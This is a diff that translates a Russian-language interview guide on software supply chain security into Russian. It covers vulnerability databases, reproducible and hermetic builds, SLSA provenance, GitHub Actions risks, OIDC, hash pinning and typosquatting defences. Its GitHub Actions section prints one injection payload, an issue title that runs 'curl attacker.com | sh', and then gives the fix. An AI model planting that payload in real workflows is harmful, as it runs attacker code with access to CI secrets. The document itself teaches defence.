-- **Registry**: Trivy scanning / ECR scan
+**Типичный стек:**
+- **Dev**: Snyk (богатая интеграция с IDE) или Trivy
+- **CI**: Trivy (бесплатный, быстрый)
+- **Registry**: сканирование Trivy / ECR scan
 - **Runtime**: Falco + Kubescape
 
-**False positives:** all have some; VEX (CycloneDX) позволяет отметить "not exploitable".
+**Ложные срабатывания:** есть у всех; VEX (CycloneDX) позволяет отметить «не эксплуатируемо».
 
 ## Q15. CVE vs GHSA database?
 
 **CVE (Common Vulnerabilities and Exposures):**
-- **MITRE** maintains; funded by US DHS
+- Ведёт **MITRE**; финансируется DHS США
 - **CVE ID:** `CVE-2021-44228` (log4shell)
-- Global canonical identifier
-- **NVD** (National Vulnerability Database) — NIST analyzes и scores
-- Lag: days/weeks between disclosure и CVE assignment
+- Глобальный канонический идентификатор
+- **NVD** (National Vulnerability Database) — NIST анализирует и оценивает
+- Задержка: дни/недели между раскрытием и присвоением CVE
 
 **GHSA (GitHub Security Advisories):**
-- GitHub-maintained database
+- БД, поддерживаемая GitHub
 - `GHSA-xxxx-xxxx-xxxx`
-- Often **faster** — maintainers publish там до CVE
-- Rich metadata: affected versions, patches, references
-- Maps to CVE when assigned
+- Часто **быстрее** — мейнтейнеры публикуют там раньше, чем появится CVE
+- Богатые метаданные: затронутые версии, патчи, ссылки
+- Сопоставляется с CVE при присвоении
 
 **OSV (Open Source Vulnerabilities):**
-- Google-initiated unified format
-- Aggregates: GHSA, PyPI, npm, RustSec, GSD
-- Machine-readable JSON
+- Унифицированный формат от Google
+- Агрегирует: GHSA, PyPI, npm, RustSec, GSD
+- Машиночитаемый JSON
 - API: `osv.dev`
 
-**How scanners use:**
-- Dependabot → GHSA (GitHub-native)
-- Trivy → NVD + GHSA + OSV + language-specific
-- Snyk → proprietary + public
+**Как используют сканеры:**
+- Dependabot → GHSA (нативно для GitHub)
+- Trivy → NVD + GHSA + OSV + источники под конкретные языки
+- Snyk → проприетарная + публичные
 
-**ID mapping:** one vuln может иметь GHSA + CVE + vendor advisory. Tools deduplicate.
+**Сопоставление ID:** у одной уязвимости могут быть GHSA + CVE + advisory вендора. Инструменты дедуплицируют.
 
-**Severity:** **CVSS score** (0-10) — computed by NVD / vendor. Но **CVSS often не reflects exploitability в твоём context** (VEX помогает).
+**Серьёзность:** **CVSS score** (0–10) — вычисляется NVD / вендором. Но **CVSS часто не отражает эксплуатируемость в твоём контексте** (помогает VEX).
 
-**CVSS 4.0 (2023):** improved, но adoption slow; CVSS 3.1 still dominant.
+**CVSS 4.0 (2023):** улучшен, но внедряется медленно; CVSS 3.1 всё ещё доминирует.
 
 ## Q16. (!) Reproducible builds?
 
-**Reproducible build** — same source → **identical byte-for-byte** binary, regardless когда/где/кем built.
+**Reproducible build** — одни и те же исходники → **байт-в-байт идентичный** бинарник, независимо от того, когда/где/кем собран.
 
 **Зачем:**
-- **Verify:** anyone can rebuild и compare hash → trust published binary
-- **Detects tampering:** SolarWinds-style attack — discrepancy caught
-- **SLSA Level 4** component
+- **Проверка:** любой может пересобрать и сравнить хеш → доверять опубликованному бинарнику
+- **Обнаружение подмены:** атака уровня SolarWinds — расхождение будет поймано
+- Компонент **SLSA Level 4**
 
-**Challenges (non-determinism):**
-- Timestamps embedded в artifacts
-- Random IDs (UUIDs)
-- Path dependencies (`/home/user/project` vs `/builds/project`)
-- Parallel compile order
-- Locale / timezone (e.g., sorted by locale)
-- Compiler versions differing
+**Проблемы (недетерминизм):**
+- Timestamps, зашитые в артефакты
+- Случайные ID (UUID)
+- Зависимость от путей (`/home/user/project` vs `/builds/project`)
+- Порядок параллельной компиляции
+- Локаль / часовой пояс (например, сортировка по локали)
+- Различия в версиях компилятора
 
-**Fixes:**
-- **`SOURCE_DATE_EPOCH`** — env var for fixed timestamp
-- Stable sort outputs
-- Stripped paths
-- Pinned compiler, deterministic flags
+**Исправления:**
+- **`SOURCE_DATE_EPOCH`** — env-переменная для фиксированного timestamp
+- Стабильная сортировка вывода
+- Зачистка путей
+- Закреплённый компилятор, детерминированные флаги
 
-**Tools:**
-- **reproducible-builds.org** — standard + tools
-- **diffoscope** — diff two binaries deeply
-- **Debian reproducible builds** — 96%+ Debian packages reproducible
-- **Nix** — designed for reproducibility
+**Инструменты:**
+- **reproducible-builds.org** — стандарт + инструменты
+- **diffoscope** — глубокий diff двух бинарников
+- **Debian reproducible builds** — 96%+ пакетов Debian воспроизводимы
+- **Nix** — спроектирован под воспроизводимость
 
-**Language:**
-- Go — mostly reproducible (since 1.10)
-- Rust — reproducible с effort
-- Java JAR — requires care (timestamps in ZIP)
+**По языкам:**
+- Go — в основном воспроизводим (с 1.10)
+- Rust — воспроизводим с усилиями
+- Java JAR — требует аккуратности (timestamps в ZIP)
 
-**Real-world:** Bitcoin Core, Tor — reproducible; multiple devs rebuild, compare.
+**Из реальной жизни:** Bitcoin Core, Tor — воспроизводимы; несколько разработчиков пересобирают и сравнивают.
 
-**Limit:** не covers sources **itself** (source can be malicious even если reproducibly builds).
+**Ограничение:** не покрывает **сами исходники** (исходник может быть вредоносным, даже если собирается воспроизводимо).
 
 ## Q17. Hermetic builds (Bazel, Nix)?
 
-**Hermetic build** — build reads **ONLY declared inputs** (source + explicitly listed deps). No network, no system state, no implicit dependencies.
+**Hermetic build** — сборка читает **ТОЛЬКО объявленные входы** (исходники + явно перечисленные deps). Никакой сети, никакого состояния системы, никаких неявных зависимостей.
 
-**Differences from reproducible:**
-- Reproducible: output = same bytes
-- Hermetic: inputs = fully declared
-- Hermetic → помогает reproducible (но reproducible possible без hermeticity)
+**Отличия от воспроизводимой:**
+- Reproducible: выход = одни и те же байты
+- Hermetic: входы = полностью объявлены
+- Hermetic → помогает reproducible (но reproducible возможен и без герметичности)
 
-**Why important:**
-- **No "works on my machine"** — system libs не leak in
-- **Cache correctness** — если declared inputs unchanged, cached output valid
-- **Security:** no network during build — can't pull malicious deps at build time
-- **SLSA L3+** требует
+**Почему это важно:**
+- **Никакого «у меня работает»** — системные библиотеки не просачиваются
+- **Корректность кеша** — если объявленные входы не менялись, кешированный вывод валиден
+- **Безопасность:** нет сети во время сборки — нельзя подтянуть вредоносные deps на этапе сборки
+- Требуется для **SLSA L3+**
 
-**Tools:**
+**Инструменты:**
 
 **Bazel:**
-- Google's build system (for Java, Go, C++, Python)
-- Sandboxed builds: workers in chroot/containers
-- Declared deps in `BUILD` files
-- Remote cache + remote execution
+- Система сборки от Google (для Java, Go, C++, Python)
+- Сборки в песочнице: воркеры в chroot/контейнерах
+- Объявленные deps в `BUILD`-файлах
+- Удалённый кеш + удалённое выполнение
 
 **Nix:**
-- Functional package manager
-- `nix build` runs in sandbox, deterministic
-- Reproducible with cryptographic hashes of inputs
-- Pure functions: `drv(inputs) → output`
+- Функциональный пакетный менеджер
+- `nix build` выполняется в песочнице, детерминирован
+- Воспроизводим за счёт криптографических хешей входов
+- Чистые функции: `drv(inputs) → output`
 
-**Others:**
-- **Buck** (Meta) — like Bazel
+**Другие:**
+- **Buck** (Meta) — как Bazel
 - **Pants** (Toolchain)
 
-**Practical challenge:**
-- Retrofitting existing Makefile project — large effort
-- Green-field: adopt Bazel/Nix from start
+**Практическая сложность:**
+- Перевод существующего Makefile-проекта — большой объём работы
+- На зелёной площадке: внедрять Bazel/Nix с самого начала
 
 **ROI:**
-- Huge monorepo (Google, Meta) — essential (cache hits 90%+)
-- Small repo — overkill
+- Огромный монорепо (Google, Meta) — необходимо (cache hits 90%+)
+- Маленький репозиторий — избыточно
 
 ## Q18. Provenance (who built what)?
 
-**Provenance** — signed metadata describing **origins** artifact: commit, builder, timestamp, environment.
+**Provenance** — подписанные метаданные, описывающие **происхождение** артефакта: коммит, сборщик, timestamp, окружение.
 
-**SLSA Provenance schema (v1):**
+**Схема SLSA Provenance (v1):**
 ```json
 {
   "buildDefinition": {
@@ -741,17 +741,17 @@ cosign verify-attestation --type cyclonedx --certificate-identity=... image:tag
 }
 ```
 
-**Zachyy:**
-- Trust: "this JAR built by our GitHub Actions from commit X" — verifiable
-- Incident response: compromised lib — все artifacts pointing к нему findable
-- SLSA L3+: non-falsifiable (builder signs, developer can't forge)
+**Зачем:**
+- Доверие: «этот JAR собран нашим GitHub Actions из коммита X» — проверяемо
+- Реакция на инцидент: скомпрометированная библиотека — все артефакты, ссылающиеся на неё, можно найти
+- SLSA L3+: неподделываемо (сборщик подписывает, разработчик не может сфабриковать)
 
-**Generation:**
-- GitHub Actions: `slsa-github-generator` official action
-- GitLab: own provenance since 2023
-- Tekton Chains: adds provenance к all builds
+**Генерация:**
+- GitHub Actions: официальный action `slsa-github-generator`
+- GitLab: собственный provenance с 2023
+- Tekton Chains: добавляет provenance ко всем сборкам
 
-**Verification:**
+**Проверка:**
 ```bash
 slsa-verifier verify-artifact myapp.tar.gz \
   --source-uri github.com/myorg/myrepo \
@@ -759,61 +759,61 @@ slsa-verifier verify-artifact myapp.tar.gz \
   --provenance-path myapp.intoto.jsonl
 ```
 
-**Policy:** admission controller verifies provenance matches expected repo + branch.
+**Политика:** admission controller проверяет, что provenance соответствует ожидаемому репозиторию + ветке.
 
 ## Q19. (!) GitHub Actions supply chain risks?
 
-**Risk surface GitHub Actions:**
+**Поверхность рисков GitHub Actions:**
 
-**1. Compromised 3rd-party actions:**
-- Pinning to branch (`@main`) → any commit runs. Attacker compromises action → all consumers run malicious code
-- **Fix:** pin to **commit SHA**: `uses: org/action@abc123...`
-- Dependabot updates SHA with review
+**1. Скомпрометированные сторонние actions:**
+- Привязка к ветке (`@main`) → выполняется любой коммит. Атакующий компрометирует action → все потребители запускают вредоносный код
+- **Фикс:** привязка к **commit SHA**: `uses: org/action@abc123...`
+- Dependabot обновляет SHA с ревью
 
-**2. Pwn requests:**
-- `pull_request_target` event runs с write permissions на fork PR
-- Attacker's fork code executes с secrets
-- Fix: avoid `pull_request_target` or use `pull_request` (no secrets)
+**2. Pwn-запросы:**
+- Событие `pull_request_target` выполняется с правами на запись для PR из форка
+- Код из форка атакующего выполняется с доступом к секретам
+- Фикс: избегать `pull_request_target` или использовать `pull_request` (без секретов)
 
-**3. Secret leakage:**
-- Action prints secret in log (even accidentally)
-- `echo "token: $TOKEN"` → exposed
-- GitHub redacts known secrets, но не всегда catches
+**3. Утечка секретов:**
+- Action печатает секрет в лог (даже случайно)
+- `echo "token: $TOKEN"` → засветился
+- GitHub маскирует известные секреты, но ловит не всегда
 
-**4. Runner privilege escalation:**
-- Self-hosted runners reusable → prior job state persists
-- Attacker PR → runner → compromises future jobs
-- Fix: ephemeral runners; don't use self-hosted для public repos
+**4. Повышение привилегий через раннер:**
+- Self-hosted-раннеры переиспользуются → состояние прошлого джоба сохраняется
+- PR атакующего → раннер → компрометация будущих джобов
+- Фикс: эфемерные раннеры; не использовать self-hosted для публичных репозиториев
 
-**5. Workflow injection:**
-- Using `${{ github.event.issue.title }}` in shell:
+**5. Инъекция в workflow:**
+- Использование `${{ github.event.issue.title }}` в shell:
   ```yaml
   run: echo "${{ github.event.issue.title }}"
   ```
-- Title: `"); curl attacker.com | sh # ` → injected
-- Fix: **always quote properly** or use env:
+- Заголовок: `"); curl attacker.com | sh # ` → инъекция
+- Фикс: **всегда правильно экранировать** или использовать env:
   ```yaml
   env:
     TITLE: ${{ github.event.issue.title }}
   run: echo "$TITLE"
   ```
 
-**6. Token permissions:**
-- `GITHUB_TOKEN` default permissions broad
-- Minimize: `permissions: contents: read` в job
+**6. Права токена:**
+- У `GITHUB_TOKEN` права по умолчанию широкие
+- Минимизировать: `permissions: contents: read` в джобе
 
-**Defense-in-depth:**
-- `allowed_actions` в org settings (allowlist)
-- Required reviewers on environment secrets
-- Hardened runners (`actions/checkout@...` pinned)
-- OIDC to cloud (no stored credentials)
-- Scan workflows с Semgrep rules
+**Эшелонированная защита (defense-in-depth):**
+- `allowed_actions` в настройках организации (allowlist)
+- Обязательные ревьюеры на секреты окружения
+- Усиленные раннеры (`actions/checkout@...` с привязкой)
+- OIDC к облаку (без хранимых учёток)
+- Сканирование workflow правилами Semgrep
 
 ## Q20. OIDC для CI (без long-lived credentials)?
 
-**Problem:** CI needs AWS/GCP/Azure creds → stored secrets → leak risk.
+**Проблема:** CI нужны учётки AWS/GCP/Azure → хранимые секреты → риск утечки.
 
-**Solution: OIDC workload federation.** CI provider (GitHub, GitLab, CircleCI) issues JWT → cloud provider trusts JWT → short-lived creds.
+**Решение: OIDC workload federation.** CI-провайдер (GitHub, GitLab, CircleCI) выпускает JWT → облачный провайдер доверяет JWT → короткоживущие учётки.
 
 **GitHub Actions → AWS:**
 ```yaml
@@ -828,7 +828,7 @@ steps:
       aws-region: us-east-1
 ```
 
-**AWS side (trust policy):**
+**Сторона AWS (trust policy):**
 ```json
 {
   "Effect": "Allow",
@@ -844,48 +844,48 @@ steps:
 }
 ```
 
-**Flow:**
-1. Workflow starts → GitHub mints JWT with claims (repo, branch)
-2. Action sends JWT to AWS STS `AssumeRoleWithWebIdentity`
-3. AWS verifies JWT signature (GitHub public keys) + condition (repo/branch match)
-4. Returns temp creds (1 hr)
+**Поток:**
+1. Workflow стартует → GitHub чеканит JWT с claims (репозиторий, ветка)
+2. Action отправляет JWT в AWS STS `AssumeRoleWithWebIdentity`
+3. AWS проверяет подпись JWT (публичные ключи GitHub) + условие (совпадение репозитория/ветки)
+4. Возвращает временные учётки (1 ч)
 
-**Benefits:**
-- **No long-lived keys** в secrets
-- **Fine-grained trust** (per repo/branch)
-- **Auditable** (CloudTrail)
-- Ротация not needed
+**Преимущества:**
+- **Нет долгоживущих ключей** в секретах
+- **Гранулярное доверие** (на репозиторий/ветку)
+- **Аудируемость** (CloudTrail)
+- Ротация не нужна
 
-**Supported:** AWS, GCP, Azure, HashiCorp Cloud, Vault, many others.
+**Поддерживается:** AWS, GCP, Azure, HashiCorp Cloud, Vault и многие другие.
 
-**Best practice:** move all CI → cloud auth через OIDC; delete IAM user access keys.
+**Best practice:** перевести весь CI → облачную аутентификацию через OIDC; удалить access-ключи IAM-пользователей.
 
 ## Q21. Pinned dependencies (hash vs version)?
 
-**Version pin:**
+**Закрепление по версии (version pin):**
 ```json
 "lodash": "4.17.21"
 ```
-- If `4.17.21` already published, locks version
-- **BUT:** npm allows overwrite (rare, но possible); compromised maintainer → new tarball with same version
+- Если `4.17.21` уже опубликована, версия зафиксирована
+- **НО:** npm допускает перезапись (редко, но возможно); скомпрометированный мейнтейнер → новый tarball с той же версией
 
-**Hash pin:**
+**Закрепление по хешу (hash pin):**
 ```json
 "lodash": "npm:lodash@4.17.21"
 "integrity": "sha512-abc123..."
 ```
-- `package-lock.json` / `yarn.lock` includes hashes
-- Install verifies hash; mismatch = fail
+- `package-lock.json` / `yarn.lock` включают хеши
+- Установка проверяет хеш; несовпадение = ошибка
 
-**Why hash pin essential:**
-- **Tamper detection:** if attacker republishes package с malicious code, hash mismatch
-- **Reproducibility:** exact same bytes always installed
+**Почему hash pin необходим:**
+- **Обнаружение подмены:** если атакующий переопубликует пакет с вредоносным кодом, хеш не совпадёт
+- **Воспроизводимость:** всегда ставятся ровно те же байты
 
-**In various ecosystems:**
+**В разных экосистемах:**
 
 **npm:**
-- `package-lock.json` automatic (npm 5+)
-- `npm ci` enforces lockfile
+- `package-lock.json` автоматически (npm 5+)
+- `npm ci` принудительно использует lockfile
 
 **Python (pip):**
 ```
@@ -897,8 +897,8 @@ requirements.txt
 - `pip install --require-hashes -r requirements.txt`
 
 **Go:**
-- `go.sum` — automatic hashes of all deps
-- `GOFLAGS=-mod=readonly` fail if changed
+- `go.sum` — автоматические хеши всех deps
+- `GOFLAGS=-mod=readonly` падает, если что-то изменилось
 
 **Docker:**
 ```dockerfile
@@ -906,151 +906,151 @@ FROM ubuntu@sha256:abc123...  # pin by digest, not tag
 ```
 
 **Java (Maven):**
-- No native hash pin; use **Maven Enforcer Plugin** with hash checking
+- Нативного hash pin нет; использовать **Maven Enforcer Plugin** с проверкой хешей
 - Или **Gradle** dependency locking
 
-**Risk без hash pins:**
-- Dependency substitution attacks
-- Subverted mirrors / caches
-- "Right version, wrong bytes"
+**Риск без hash pins:**
+- Атаки подмены зависимостей
+- Скомпрометированные зеркала / кеши
+- «Правильная версия, неправильные байты»
 
 ## Q22. (!) Как защититься от typosquatting?
 
-**Typosquatting** — attacker publishes package с именем похожим на popular: `electorn` vs `electron`, `reqeusts` vs `requests`.
+**Typosquatting** — атакующий публикует пакет с именем, похожим на популярное: `electorn` vs `electron`, `reqeusts` vs `requests`.
 
-**Defenses:**
+**Защита:**
 
-**1. Internal package registry:**
-- Private npm/PyPI mirror
-- Only vetted packages allowed
-- Developer `npm install X` → hits internal first
+**1. Внутренний реестр пакетов:**
+- Приватное зеркало npm/PyPI
+- Разрешены только проверенные пакеты
+- `npm install X` у разработчика → сначала идёт во внутренний
 
 **2. Allowlists:**
-- CI blocks installs of unapproved packages
-- `package.json` reviewed on PR
+- CI блокирует установку неодобренных пакетов
+- `package.json` проходит ревью в PR
 
-**3. Scoped packages:**
-- `@myorg/mylib` — scope reserved (prevents confusion)
+**3. Scoped-пакеты:**
+- `@myorg/mylib` — scope зарезервирован (предотвращает путаницу)
 
-**4. Scan commits для new deps:**
-- New dep added → SCA review before merge
-- Socket.dev / Deps.dev — surface suspicious packages
+**4. Сканирование коммитов на новые deps:**
+- Добавлена новая зависимость → SCA-ревью перед merge
+- Socket.dev / Deps.dev — подсвечивают подозрительные пакеты
 
-**5. Time-delay upgrade:**
-- Don't auto-upgrade brand-new packages (< 7 days old)
-- Gives community time to detect malicious
+**5. Отложенный апгрейд:**
+- Не обновляться автоматически на совсем новые пакеты (моложе 7 дней)
+- Даёт сообществу время выявить вредонос
 
-**6. Human review critical deps:**
-- Top-N deps (logging, crypto, web framework) — review сами source
+**6. Ручное ревью критичных deps:**
+- Топ-N зависимостей (логирование, крипто, веб-фреймворк) — ревьюить сами исходники
 
-**7. Monitor for typosquats:**
-- `package-name-checker` services
-- Register common typos of your own packages proactively
+**7. Мониторинг typosquat-ов:**
+- Сервисы вроде `package-name-checker`
+- Проактивно регистрировать частые опечатки имён своих же пакетов
 
-**8. Dependency confusion prevention:**
-- Register private package names on **public registry** to prevent squatting
-- Configure package manager to prefer internal registry
+**8. Предотвращение dependency confusion:**
+- Регистрировать имена приватных пакетов в **публичном реестре**, чтобы их не заняли
+- Настроить пакетный менеджер на приоритет внутреннего реестра
 
-**9. Pinned dependencies (q21):**
-- Mass version injection — detected at hash mismatch
+**9. Закреплённые зависимости (q21):**
+- Массовая подмена версий — обнаруживается по несовпадению хеша
 
-**Real examples caught:**
-- `colors` package (2022) — maintainer self-sabotage; caught post-damage
-- PyPI mass typosquat (hundreds packages) — auto-detected by PyPI
+**Реальные пойманные примеры:**
+- Пакет `colors` (2022) — самосаботаж мейнтейнера; пойман уже после ущерба
+- Массовый typosquat в PyPI (сотни пакетов) — автоматически обнаружен PyPI
 
 ## Q23. (!) Vendor risk assessment?
 
-**When onboarding 3rd-party software / SaaS:**
+**При онбординге стороннего ПО / SaaS:**
 
-**Questions:**
+**Вопросы:**
 
-**Security posture:**
-- SOC 2 Type II / ISO 27001 certified?
-- Pen-test reports available?
-- Incident response plan?
-- Data breach history?
+**Состояние безопасности:**
+- Есть сертификация SOC 2 Type II / ISO 27001?
+- Доступны отчёты по пентестам?
+- Есть план реагирования на инциденты?
+- История утечек данных?
 
-**Data handling:**
-- Where data stored (region, jurisdiction)?
-- Encryption at rest / in transit?
-- Data retention / deletion policies?
-- GDPR, CCPA compliance?
+**Обработка данных:**
+- Где хранятся данные (регион, юрисдикция)?
+- Шифрование at rest / in transit?
+- Политики хранения / удаления данных?
+- Соответствие GDPR, CCPA?
 
-**Access & auth:**
-- SSO / SAML / OIDC support?
-- MFA enforcement?
+**Доступ и аутентификация:**
+- Поддержка SSO / SAML / OIDC?
+- Принудительный MFA?
 - RBAC / least-privilege?
-- Audit logs?
+- Журналы аудита?
 
-**Supply chain:**
-- Sub-processors disclosed?
-- Dependency security practices?
-- SBOM available?
+**Цепочка поставок:**
+- Раскрыты ли субподрядчики (sub-processors)?
+- Практики безопасности по зависимостям?
+- Доступен ли SBOM?
 
-**Operational:**
+**Операционка:**
 - SLA / uptime?
-- Status page / incident communication?
-- Backup and recovery?
+- Status-страница / коммуникация по инцидентам?
+- Бэкап и восстановление?
 
-**Tools:**
-- **Whistic**, **OneTrust** — vendor management platforms
-- **Security questionnaires** (SIG Lite, CAIQ)
-- **OpenFINT, Trust centers** — vendor published evidence
+**Инструменты:**
+- **Whistic**, **OneTrust** — платформы управления вендорами
+- **Опросники по безопасности** (SIG Lite, CAIQ)
+- **OpenFINT, Trust-центры** — опубликованные вендором свидетельства
 
-**Ongoing:**
-- Annual re-assessment
-- Monitor for breaches (news, HIBP)
-- Renewal checkpoint
+**На постоянной основе:**
+- Ежегодная переоценка
+- Мониторинг утечек (новости, HIBP)
+- Контрольная точка при продлении
 
-**Critical vendors:**
-- **Tier 1** (auth provider, cloud) — high scrutiny
-- **Tier 2** (CMS, analytics) — medium
-- **Tier 3** (utility tools) — basic
+**Критичные вендоры:**
+- **Tier 1** (провайдер аутентификации, облако) — высокий контроль
+- **Tier 2** (CMS, аналитика) — средний
+- **Tier 3** (вспомогательные инструменты) — базовый
 
-**Budget:** security review takes **weeks** для Tier 1 — start early.
+**Бюджет:** ревью безопасности для Tier 1 занимает **недели** — начинайте заранее.
 
 ## Q24. Supply chain security roadmap?
 
-**Pragmatic adoption order:**
+**Прагматичный порядок внедрения:**
 
-**Phase 1 — Visibility (weeks):**
-1. Enable Dependabot on all repos
-2. Generate SBOM в CI (Syft) — upload as artifact
-3. Scan containers с Trivy в CI
+**Фаза 1 — Видимость (недели):**
+1. Включить Dependabot на всех репозиториях
+2. Генерировать SBOM в CI (Syft) — загружать как артефакт
+3. Сканировать контейнеры через Trivy в CI
 4. GitHub code scanning (Semgrep, CodeQL)
 
-**Phase 2 — Harden build (1-2 months):**
-5. Pin actions к commit SHAs
-6. Minimum `GITHUB_TOKEN` permissions
-7. OIDC to cloud (replace long-lived creds)
-8. Branch protection + required reviews
-9. Signed commits (gitsign)
+**Фаза 2 — Усиление сборки (1–2 месяца):**
+5. Привязать actions к commit SHA
+6. Минимальные права `GITHUB_TOKEN`
+7. OIDC к облаку (заменить долгоживущие учётки)
+8. Защита веток + обязательные ревью
+9. Подписанные коммиты (gitsign)
 
-**Phase 3 — Attestations (months):**
-10. Sign artifacts с Cosign (keyless)
+**Фаза 3 — Attestations (месяцы):**
+10. Подписывать артефакты через Cosign (keyless)
 11. SLSA L3 provenance (slsa-github-generator)
-12. SBOM attestation на artifacts
-13. Vuln scan attestation
+12. SBOM-attestation на артефактах
+13. Attestation сканирования уязвимостей
 
-**Phase 4 — Enforce (quarters):**
-14. Admission controller (Kyverno) verifies signatures
-15. Policy: only signed images deploy
-16. Required SBOM + provenance attestation
-17. Vendor risk process formal
+**Фаза 4 — Принуждение (кварталы):**
+14. Admission controller (Kyverno) проверяет подписи
+15. Политика: деплоятся только подписанные образы
+16. Обязательные attestations SBOM + provenance
+17. Формализованный процесс vendor risk
 
-**Phase 5 — Advanced (ongoing):**
-18. Reproducible builds pilot
-19. Hermetic builds (Bazel) for critical services
-20. VEX statements for known false positives
-21. Red team: simulate supply chain attack
+**Фаза 5 — Продвинутое (постоянно):**
+18. Пилот воспроизводимых сборок
+19. Герметичные сборки (Bazel) для критичных сервисов
+20. VEX-утверждения для известных ложных срабатываний
+21. Red team: симуляция supply chain attack
 
-**Metrics:**
-- % repos with Dependabot
-- % artifacts signed
-- Mean time to patch CVE
-- # unapproved packages blocked
+**Метрики:**
+- % репозиториев с Dependabot
+- % подписанных артефактов
+- Среднее время до патча CVE
+- Кол-во заблокированных неодобренных пакетов
 
-**Trap:** tool sprawl. Start с 2-3 tools integrated well, then expand.
+**Ловушка:** разрастание инструментов. Начните с 2–3 хорошо интегрированных, затем расширяйте.
 
 ---
 
